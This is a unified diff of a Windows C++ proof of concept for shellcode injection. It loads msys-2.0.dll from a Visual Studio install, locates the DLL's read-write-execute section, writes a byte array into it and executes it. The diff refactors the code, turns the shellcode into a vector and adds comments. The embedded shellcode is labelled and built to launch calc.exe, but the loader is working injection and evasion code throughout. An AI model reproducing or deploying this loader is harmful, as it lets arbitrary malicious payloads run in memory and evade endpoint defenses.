@@ -2,9 +2,22 @@
 #include <Windows.h>
 #include <Psapi.h>
 #include <dbghelp.h>
-#include <windows.h>
+#include <vector>
 
-char SHELLCODE[] = "\x55\x48\x89\xE5\x48\x81\xEC\x90\x00\x00\x00\x48\x31\xC0\x65\x48\x8B\x04\x25\x30\x00\x00\x00\x48\x8B\x40\x60\x48\x8B\x40\x18\x48\x8B\x40\x20\x48\x8B\x00\x48\x8B\x00\x48\x8D\x40\xF0\x48\x8B\x40\x30\x48\x31\xDB\x8B\x58\x3C\x48\x01\xC3\x48\x81\xC3\x88\x00\x00\x00\x48\x31\xC9\x8B\x0B\x48\x01\xC1\x48\x89\x8D\x70\xFF\xFF\xFF\x48\x31\xD2\x8B\x51\x1C\x48\x01\xC2\x48\x89\x55\x90\x48\x31\xDB\x8B\x51\x20\x48\x01\xC2\x48\x89\x55\xA0\x48\x31\xC9\x48\x31\xD2\x51\x48\xB9\xFF\x57\x69\x6E\x45\x78\x65\x63\x48\xC1\xE9\x08\x51\x54\x48\x31\xC9\xB1\x07\x51\x41\x58\x41\x59\x4D\x31\xE4\x4C\x89\xC1\x4C\x89\xCE\x48\x8B\x55\xA0\x42\x8B\x14\xA2\x49\xFF\xC4\x4C\x8D\x1C\x02\x4C\x89\xDF\xF3\xA6\x75\xE4\x48\x83\xC4\x10\x49\xFF\xCC\x48\x31\xFF\x48\x31\xD2\xB2\x04\x48\x01\xD7\x50\x48\x89\xF8\x4C\x89\xE6\x48\xF7\xEE\x48\x89\xC6\x58\x48\x8B\x7D\x90\x48\x8D\x3C\x37\x8B\x3F\x48\x01\xC7\x48\xBB\x41\x41\x41\x41\x2E\x65\x78\x65\x48\xC1\xEB\x20\x53\x48\xBB\x6D\x33\x32\x5C\x63\x61\x6C\x63\x53\x48\xBB\x77\x73\x5C\x73\x79\x73\x74\x65\x53\x48\xBB\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x53\x54\x59\x48\xFF\xC2\x48\x83\xEC\x20\xFF\xD7";
+// Calc shellcode
+std::vector<uint8_t> Shellcode = {
+    0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x90, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8B,
+    0x40, 0x60, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8D, 0x40, 0xF0, 0x48, 0x8B, 0x40, 0x30, 0x48,
+    0x31, 0xDB, 0x8B, 0x58, 0x3C, 0x48, 0x01, 0xC3, 0x48, 0x81, 0xC3, 0x88, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC9, 0x8B, 0x0B, 0x48, 0x01, 0xC1, 0x48, 0x89,
+    0x8D, 0x70, 0xFF, 0xFF, 0xFF, 0x48, 0x31, 0xD2, 0x8B, 0x51, 0x1C, 0x48, 0x01, 0xC2, 0x48, 0x89, 0x55, 0x90, 0x48, 0x31, 0xDB, 0x8B, 0x51, 0x20, 0x48,
+    0x01, 0xC2, 0x48, 0x89, 0x55, 0xA0, 0x48, 0x31, 0xC9, 0x48, 0x31, 0xD2, 0x51, 0x48, 0xB9, 0xFF, 0x57, 0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x48, 0xC1,
+    0xE9, 0x08, 0x51, 0x54, 0x48, 0x31, 0xC9, 0xB1, 0x07, 0x51, 0x41, 0x58, 0x41, 0x59, 0x4D, 0x31, 0xE4, 0x4C, 0x89, 0xC1, 0x4C, 0x89, 0xCE, 0x48, 0x8B,
+    0x55, 0xA0, 0x42, 0x8B, 0x14, 0xA2, 0x49, 0xFF, 0xC4, 0x4C, 0x8D, 0x1C, 0x02, 0x4C, 0x89, 0xDF, 0xF3, 0xA6, 0x75, 0xE4, 0x48, 0x83, 0xC4, 0x10, 0x49,
+    0xFF, 0xCC, 0x48, 0x31, 0xFF, 0x48, 0x31, 0xD2, 0xB2, 0x04, 0x48, 0x01, 0xD7, 0x50, 0x48, 0x89, 0xF8, 0x4C, 0x89, 0xE6, 0x48, 0xF7, 0xEE, 0x48, 0x89,
+    0xC6, 0x58, 0x48, 0x8B, 0x7D, 0x90, 0x48, 0x8D, 0x3C, 0x37, 0x8B, 0x3F, 0x48, 0x01, 0xC7, 0x48, 0xBB, 0x41, 0x41, 0x41, 0x41, 0x2E, 0x65, 0x78, 0x65,
+    0x48, 0xC1, 0xEB, 0x20, 0x53, 0x48, 0xBB, 0x6D, 0x33, 0x32, 0x5C, 0x63, 0x61, 0x6C, 0x63, 0x53, 0x48, 0xBB, 0x77, 0x73, 0x5C, 0x73, 0x79, 0x73, 0x74,
+    0x65, 0x53, 0x48, 0xBB, 0x43, 0x3A, 0x5C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x53, 0x54, 0x59, 0x48, 0xFF, 0xC2, 0x48, 0x83, 0xEC, 0x20, 0xFF, 0xD7
+};
 
 
 struct SectionDescriptor {
@@ -12,6 +25,7 @@ struct SectionDescriptor {
     LPVOID end;
 };
 
+// Function to find offset of RWX section in given DLL
 DWORD_PTR FindRWXOffset(HMODULE hModule) {
     IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
     if (ntHeader != NULL) {
@@ -23,7 +37,7 @@ DWORD_PTR FindRWXOffset(HMODULE hModule) {
                 DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                 std::cout << "Base Adress : " << std::hex << baseAddress << std::endl;
                 std::cout << "Section Offset : " << std::hex << sectionOffset << std::endl;
-                std::cout << "Size of section : " << sectionSize << std::endl;
+                std::cout << "Size of RWX section : " << sectionSize << std::endl;
                 return sectionOffset;
             }
             sectionHeader++;
@@ -32,6 +46,7 @@ DWORD_PTR FindRWXOffset(HMODULE hModule) {
     return 0;
 }
 
+// Function to find size of RWX section in given DLL
 DWORD_PTR FindRWXSize(HMODULE hModule) {
     IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
     if (ntHeader != NULL) {
@@ -39,7 +54,7 @@ DWORD_PTR FindRWXSize(HMODULE hModule) {
         for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
             if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                 DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
-                std::cout << "Size of section : " << sectionSize << std::endl;
+                std::cout << "Size of RWX section : " << sectionSize << std::endl;
                 return sectionSize;
             }
             sectionHeader++;
@@ -48,57 +63,58 @@ DWORD_PTR FindRWXSize(HMODULE hModule) {
     return 0;
 }
 
-void WriteCodeToSection(LPVOID rwxSectionAddr, const char* shellcode, SIZE_T sizeShellcode) {
-    memcpy((LPVOID)rwxSectionAddr, shellcode, sizeShellcode);
-    std::cout << sizeShellcode << " bytes of shellcode Written to RWX Memory Region\n";
+// Function to write Shellcode to RWX section of DLL
+void WriteCodeToSection(LPVOID rwxSectionAddr, const std::vector<uint8_t>& shellcode) {
+    std::copy(shellcode.begin(), shellcode.end(), static_cast<uint8_t*>(rwxSectionAddr));
+    std::cout << shellcode.size() << " bytes of Sh3llc0d3 written to RWX Memory Region\n";
 }
 
+// Function to execute Shellcode from RWX section of DLL
 void ExecuteCodeFromSection(LPVOID rwxSectionAddr) {
-    //inline assembly execution
-    ((void(*)())rwxSectionAddr)();
-    std::cout << "Execution of shellcode Written to RWX Memory Region\n";
+    // Define a function pointer to the shellcode
+    using ShellcodeFunction = void(*)();
+    ShellcodeFunction shellcodeFunction = reinterpret_cast<ShellcodeFunction>(rwxSectionAddr);
+
+    // Call the shellcode function
+    shellcodeFunction();
+    std::cout << "Execution of Sh3llc0d3 from RWX Memory Region\n";
 }
 
 int main()
 {
-    std::cout << "Hello World!\n";
-    // Load the vulnerable DLL
+    std::cout << "Main function execution...\n";
+    // Load the hardcoded vulnerable DLL
     HMODULE hDll = ::LoadLibraryW(L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll");
 
     if (hDll == nullptr) {
-        // fail
-        std::cout << "Fail to load the targeted DLL\n";
+        // Failed to load the DLL
+        std::cout << "[!] Failed to load the targeted DLL\n";
         return 1;
     }
 
     MODULEINFO moduleInfo;
-    if (!::GetModuleInformation(
-        ::GetCurrentProcess(),
-        hDll,
-        &moduleInfo,
-        sizeof(MODULEINFO))
-        ) {
-        // fail
-        std::cout << "Fail to get module info\n";
+    if (!::GetModuleInformation(::GetCurrentProcess(),hDll,&moduleInfo,sizeof(MODULEINFO))) {
+        // Failed to get the module info
+        std::cout << "[!] Failed to get module info\n";
+        return 1;
     }
 
+    // Find the offset and size of RWX section in the DLL
     DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll);
     DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);
 
 
     // Access the default RWX section (Vulnerable DLL address + offset)
-    LPVOID rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);
-    std::cout << "Adress of RWX Section : " << rwxSectionAddr << std::endl;
+    LPVOID rwxSectionAddr = reinterpret_cast<LPVOID>(reinterpret_cast<PBYTE>(moduleInfo.lpBaseOfDll) + RWX_SECTION_OFFSET);
+    std::cout << "Address of RWX Section : " << rwxSectionAddr << std::endl;
 
     SectionDescriptor descriptor = SectionDescriptor{
-        rwxSectionAddr,(LPVOID)((PBYTE)rwxSectionAddr + RWX_SECTION_SIZE)
-
+        rwxSectionAddr, reinterpret_cast<LPVOID>(reinterpret_cast<PBYTE>(rwxSectionAddr) + RWX_SECTION_SIZE)
     };
-    std::cout << "RWX section starts at " << descriptor.start << " and ends at " << descriptor.end << std::endl;;
+    std::cout << "RWX section starts at " << descriptor.start << " and ends at " << descriptor.end << std::endl;
 
-    SIZE_T shellcodesize = sizeof(SHELLCODE);
     // Write the injected code to the RWX section
-    WriteCodeToSection(rwxSectionAddr, SHELLCODE, shellcodesize);
+    WriteCodeToSection(rwxSectionAddr, Shellcode);
 
     // Execute the injected code
     ExecuteCodeFromSection(rwxSectionAddr);
